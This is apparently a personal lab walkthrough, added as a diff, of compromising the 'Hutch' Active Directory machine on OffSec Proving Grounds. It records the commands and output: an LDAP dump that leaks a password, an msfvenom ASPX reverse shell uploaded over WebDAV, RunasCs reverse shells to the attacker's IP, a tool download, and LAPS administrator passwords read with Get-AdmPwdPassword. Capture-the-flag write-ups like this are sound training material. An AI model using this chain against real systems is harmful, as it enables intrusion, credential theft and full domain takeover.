@@ -1,0 +1,177 @@
+No credentials were provided for this machine
+
+nmap -vvv -T5 -Pn 192.168.192.122 -p- -A -oN nmap.txt
+
+sudo echo "192.168.192.122 hutch.offsec" | sudo tee -a /etc/hosts
+
+http://hutch.offsec/
+
+┌──(lepotekil㉿kali)-[~/proving-ground-prac/hutch]
+└─$ dig any hutch.offsec @192.168.192.122
+....
+hutch.offsec.           600     IN      A       192.168.120.108
+hutch.offsec.           3600    IN      NS      hutchdc.hutch.offsec.
+hutch.offsec.           3600    IN      SOA     hutchdc.hutch.offsec. hostmaster.hutch.offsec. 20 900 600 86400 3600
+hutchdc.hutch.offsec.   3600    IN      A       192.168.192.122
+....
+
+sudo echo "192.168.192.122 hutchdc.hutch.offsec" | sudo tee -a /etc/hosts
+
+https://hackviser.com/tactics/pentesting/services/ldap#advanced-ldap-searches
+
+ldapsearch -x -H ldap://hutch.offsec -b "dc=hutch,dc=offsec" "*" > ldapsearch.txt
+
+# Freddy McSorley, Users, hutch.offsec
+dn: CN=Freddy McSorley,CN=Users,DC=hutch,DC=offsec
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: Freddy McSorley
+description: Password set to CrabSharkJellyfish192 at user's request. Please c
+
+userPrincipalName: fmcsorley@hutch.offsec
+
+https://hackviser.com/tactics/pentesting/services/webdav#connect
+
+┌──(lepotekil㉿kali)-[~/proving-ground-prac/hutch]
+└─$ cadaver http://hutch.offsec/         
+Authentication required for hutch.offsec on server `hutch.offsec':
+Username: fmcsorley@hutch.offsec
+Password: 
+dav:/> ls
+Listing collection `/': succeeded.
+Coll:   aspnet_client                          0  Nov  4  2020
+        iisstart.htm                         703  Nov  4  2020
+        iisstart.png                       99710  Nov  4  2020
+        index.aspx                          1241  Nov  4  2020
+dav:/>
+
+https://hackviser.com/tactics/pentesting/services/webdav#file-upload-put-method
+
+i can upload file but for .php extension, the file is not found
+
+┌──(lepotekil㉿kali)-[~/proving-ground-prac/hutch]
+└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.170 LPORT=5555 -f aspx -o shell.aspx
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of aspx file: 3422 bytes
+Saved as: shell.aspx
+
+dav:/> put shell.aspx 
+Uploading shell.aspx to '/shell.aspx':
+Progress: [=============================>] 100.0% of 3422 bytes succeeded.
+dav:/>
+
+--> http://hutch.offsec/shell.aspx
+
+┌──(lepotekil㉿kali)-[~/proving-ground-prac/hutch]
+└─$ nc -lvnp 5555 
+listening on [any] 5555 ...
+connect to [192.168.45.170] from (UNKNOWN) [192.168.192.122] 50258
+Microsoft Windows [Version 10.0.17763.1637]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+c:\windows\system32\inetsrv>whoami
+whoami
+iis apppool\defaultapppool
+
+c:\Users\fmcsorley\Desktop>type local.txt
+type local.txt
+bdfd1179ee76ef35b92b5ef79a177a0a
+
+https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/laps
+https://www.it-connect.fr/chapitres/comment-afficher-les-mots-de-passe-laps/
+
+c:\Users\fmcsorley\Desktop>powershell
+powershell
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Users\fmcsorley\Desktop> Get-ChildItem 'C:\Program Files\LAPS\CSE\Admpwd.dll'
+Get-ChildItem 'C:\Program Files\LAPS\CSE\Admpwd.dll'
+
+
+    Directory: C:\Program Files\LAPS\CSE
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-a----        9/22/2016   9:02 AM         148632 Admpwd.dll                                                            
+
+
+PS C:\Users\fmcsorley\Desktop>
+
+PS C:\Windows\temp> .\RunasCs.exe fmcsorley@hutch.offsec CrabSharkJellyfish192 powershell.exe -r 192.168.45.170:80 
+.\RunasCs.exe fmcsorley@hutch.offsec CrabSharkJellyfish192 powershell.exe -r 192.168.45.170:80 
+[*] Warning: Logon for user 'fmcsorley@hutch.offsec' is limited. Use the --logon-type value '8' to obtain a more privileged token
+[*] Warning: LoadUserProfile failed due to insufficient permissions
+[+] Running in session 0 with process function CreateProcessAsUserW()
+[+] Using Station\Desktop: Service-0x0-574b8c$\Default
+[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 4852 created in background.
+
+┌──(lepotekil㉿kali)-[~/proving-ground-prac/hutch]
+└─$ nc -lvnp 80  
+listening on [any] 80 ...
+connect to [192.168.45.170] from (UNKNOWN) [192.168.192.122] 50543
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\System32> whoami
+whoami
+hutch\fmcsorley
+PS C:\Windows\System32> Get-ADComputer -Filter * -SearchBase "DC=hutch,DC=offsec" | Get-AdmPwdPassword
+Get-ADComputer -Filter * -SearchBase "DC=hutch,DC=offsec" | Get-AdmPwdPassword
+
+ComputerName         DistinguishedName                             Password           ExpirationTimestamp 
+------------         -----------------                             --------           ------------------- 
+HUTCHDC              CN=HUTCHDC,OU=Domain Controllers,DC=hutch,... u#VVOd5;M.7138     11/21/2025 5:18:3...
+
+
+PS C:\Windows\System32>
+
+pass --> 'u#VVOd5;M.7138'
+
+PS C:\Windows\temp> del RunasCS.exe
+del RunasCS.exe
+PS C:\Windows\temp> whoami
+whoami
+iis apppool\defaultapppool
+PS C:\Windows\temp>
+
+PS C:\Windows\temp> .\RunasCs.exe
+.\RunasCs.exe
+Access is denied
+At line:1 char:1
++ .\RunasCs.exe
++ ~~~~~~~~~~~~~
+    + CategoryInfo          : OperationStopped: (:) [], UnauthorizedAccessException
+    + FullyQualifiedErrorId : System.UnauthorizedAccessException
+ 
+PS C:\Windows\temp> iwr http://192.168.45.170:8000/RunasCs.exe -OutFile RunasCs.exe
+iwr http://192.168.45.170:8000/RunasCs.exe -OutFile RunasCs.exe
+
+PS C:\Windows\temp> .\RunasCs.exe Administrator "u#VVOd5;M.7138" powershell.exe -r 192.168.45.170:443
+.\RunasCs.exe Administrator "u#VVOd5;M.7138" powershell.exe -r 192.168.45.170:443
+
+[+] Running in session 0 with process function CreateProcessWithLogonW()
+[+] Using Station\Desktop: Service-0x0-574b8c$\Default
+[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 3084 created in background.
+PS C:\Windows\temp>
+
+┌──(lepotekil㉿kali)-[~/proving-ground-prac/hutch]
+└─$ nc -lvnp 443 
+listening on [any] 443 ...
+connect to [192.168.45.170] from (UNKNOWN) [192.168.192.122] 50583
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32> whoami
+whoami
+hutch\administrator
+PS C:\Windows\system32> type C:\Users\Administrator\desktop\proof.txt
+type C:\Users\Administrator\desktop\proof.txt
+516ffa844c1a32ba81e836cf10efc68c
+PS C:\Windows\system32>
